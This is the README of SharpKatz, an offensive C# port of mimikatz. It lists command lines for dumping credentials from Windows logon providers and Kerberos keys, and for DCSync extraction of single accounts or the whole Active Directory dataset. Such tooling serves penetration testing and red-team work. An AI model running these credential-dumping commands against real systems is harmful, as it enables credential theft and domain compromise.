# SharpKatz
Porting of mimikatz sekurlsa::logonpasswords,  sekurlsa::ekeys and lsadump::dcsync

**Usage**

Ekeys

```SharpKatz.exe --Command ekeys```<br>
 list Kerberos encryption keys <br>
 <br>

Msv

```SharpKatz.exe --Command msv``` <br>
Retrive user credentials from Msv provider <br>
<br>

Kerberos

```SharpKatz.exe --Command kerberos```<br>
Retrive user credentials from Kerberos provider <br>
<br>

Tspkg

```SharpKatz.exe --Command tspkg```<br>
Retrive user credentials from Tspkg provider <br>
<br>

Credman

```SharpKatz.exe --Command credman```<br>
Retrive user credentials from Credman provider <br>
<br>

WDigest

```SharpKatz.exe --Command wdigest```<br>
Retrive user credentials from WDigest provider <br>
<br>

Logonpasswords

```SharpKatz.exe --Command logonpasswords```<br>
Retrive user credentials from all providers <br>
<br>

DCSync

```SharpKatz.exe --Command dcsync --User user --Domain userdomain --DomainController dc```<br>
Dump user credential by username <br>
<br>
```SharpKatz.exe --Command dcsync --Guid guid --Domain userdomain --DomainController dc```<br>
Dump user credential by GUID <br>
<br>
```SharpKatz.exe --Command dcsync --Domain userdomain --DomainController dc```<br>
Export the entire dataset from AD <br>
<br>
